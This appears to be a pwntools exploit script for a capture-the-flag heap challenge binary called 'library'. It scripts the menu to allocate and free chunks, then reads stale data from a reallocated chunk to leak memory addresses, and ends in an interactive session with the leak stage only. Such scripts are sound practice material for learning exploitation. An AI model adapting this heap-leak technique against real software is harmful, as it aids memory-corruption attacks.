from pwn import *
context (log_level="debug")
p = process('./library')
gdb.attach(p)
def add(length):
	p.recvuntil('our option $')
	p.sendline('1')
	p.recvuntil('ax size : ')
	p.sendline(str(length))
	p.recvuntil('ly done.')

def dele(index):
	p.recvuntil('our option $')
	p.sendline('5')
	p.recvuntil('Category ID : ')
	p.sendline(str(index))
	p.recvuntil('ly done!\n')
def addcontent(index,list):
	for l in list:
		p.recvuntil('our option $')
		p.sendline('1')
		p.recvuntil('Category ID : ')
		p.sendline(str(index))
		p.recvuntil('ok ID :')
		p.sendline(l)
def setid(index,content):
	p.recvuntil('our option $')
	p.sendline('2')
	p.recvuntil('Category ID : ')
	p.sendline(str(index))
	p.recvuntil('ok ID :')
	p.sendline(content)
def getid(index,book_index):
	p.recvuntil('our option $')
	p.sendline('3')
	p.recvuntil('Category ID : ')
	p.sendline(str(index))
	p.recvuntil('index : ')
	p.sendline(str(book_index))
	data = p.recvline()[11:-1]
	print hex(int(data))

add(63)#0
add(64)#1
add(64)#2
add(0x10)#3
dele(0)
dele(1)
dele(2)
add(96)#4
# setid(3,'1234')
getid(4,0)
getid(4,1)
getid(4,2)
getid(4,3)
p.interactive()